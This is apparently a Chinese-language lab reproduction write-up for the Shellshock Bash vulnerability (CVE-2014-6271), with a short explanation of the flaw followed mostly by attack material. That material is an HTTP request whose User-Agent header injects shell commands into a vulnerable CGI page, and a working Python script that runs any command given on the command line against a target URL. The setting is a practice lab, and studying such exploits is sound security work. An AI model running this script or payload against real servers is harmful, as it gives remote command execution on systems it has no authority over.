## Shellsock(Cve-2014-6271)

**shelshocke简介**：

- shellshock即unix 系统下的bash shell的一个漏洞，Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。
- bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义，而在处理这样的恶意的函数环境变量时，并没有以函数结尾 “}” 为结束，而是执行其后的恶意shell命令。
- 执行CGI 时会调用Bash将Referer、host、UserAgent、header等作为环境变量进行处理。

**复现记录：**

- 打开http://ip:8080，可以看到靶场准备了两个cgi文件，safe.cgi是由最新版本的bash生成的，victim.cgi是由bash4.3生成的页面，漏洞所在。

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636960868301-74251578-bd62-47ae-947b-f09f22b5db7d.png#clientId=ue9ed9240-063b-4&from=paste&height=253&id=u038b7be2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=505&originWidth=1102&originalType=binary&ratio=1&size=54099&status=done&style=none&taskId=u21b8432f-f8c1-44b9-9b2b-65f39dc8d97&width=551)
**payload**：

- **User-Agent: () { :;};echo;echo $(/bin/ls -al /);/usr/bin/id; **
```php
GET /victim.cgi HTTP/1.1
Host: 192.168.0.140:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: () { :;};echo;echo $(/bin/ls -al /);/usr/bin/id;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636960943826-dbb692ba-2707-403f-b1d2-6f3a409496a6.png#clientId=ue9ed9240-063b-4&from=paste&height=382&id=u42069a7f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=764&originWidth=1509&originalType=binary&ratio=1&size=150501&status=done&style=none&taskId=u551dab66-558e-42db-9c63-56b99d775f9&width=754.5)
**Python漏洞利用脚本**
```php
import sys
import requests

def exploit(url,cmd):
    if "://" not in url:
        url = "http://" + url
    if "victim" not in url:
        url = url + "/victim.cgi"
    payload = "() { :;};echo;echo $(/usr/bin/%s;);echo $(/bin/%s;)" % (cmd,cmd)
    header = {"User-Agent":payload}
    result = requests.get(url,headers=header)
    if result.status_code==200:
        print(result.text)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("[*]Usage:{} <target> <cmd>".format(sys.argv[0]))
        sys.exit(0)
    url = sys.argv[1]
    cmd = sys.argv[2]
    exploit(url,cmd)
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636961375989-d716016e-6a40-4010-86de-38ccd8cdf205.png#clientId=ua57a65c7-28bb-4&from=paste&height=308&id=u24d656f9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=615&originWidth=1745&originalType=binary&ratio=1&size=62253&status=done&style=none&taskId=uf3bbdfd3-c379-4832-bebb-0cd9a4a1924&width=872.5)
